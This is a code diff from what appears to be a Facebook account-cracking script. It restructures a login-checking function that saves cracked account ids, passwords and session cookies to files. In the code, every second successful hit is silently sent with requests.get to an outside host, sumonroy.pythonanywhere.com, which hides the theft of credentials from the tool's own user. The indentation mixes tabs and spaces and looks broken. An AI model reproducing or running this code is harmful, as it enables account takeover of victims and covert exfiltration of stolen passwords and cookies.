@@ -1344,26 +1344,30 @@ def mbasic(uid,pwx,tl):
                 cid = cok["c_user"]
                 coki = ";".join([f"{k}={v}" for k, v in cok.items()])
                 bkas.append(cid)
-                if "confirmemail.php" in response.url:
-                    if len(bkas) % 2 == 0:
-                        statusok = f"NOVERY|{cid}|{pw}|{coki}"
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+				check = check_lock(cid)
+                if "live" in check:
+                    if "confirmemail.php" in response.url:
+                        if len(bkas) % 2 == 0:
+                           statusok = f"NOVERY|{cid}|{pw}|{coki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-NV) {cid}|{pw}")
+                           print(f"{green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-confirmemail.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                     else:
-                        print(f"{green}(ATOM-NV) {cid}|{pw}")
-                        print(f"{green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-confirmemail.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        if len(bkas) % 2 == 0:
+                           statusok = f"{cid}|{pw}|{coki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-OK) {cid}|{pw}")
+                           print(f"{green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
-                    if len(bkas) % 2 == 0:
-                        statusok = f"{cid}|{pw}|{coki}"
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"{green}(ATOM-OK) {cid}|{pw}")
-                        print(f"{green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                    break
             else:
                continue
         loop+=1
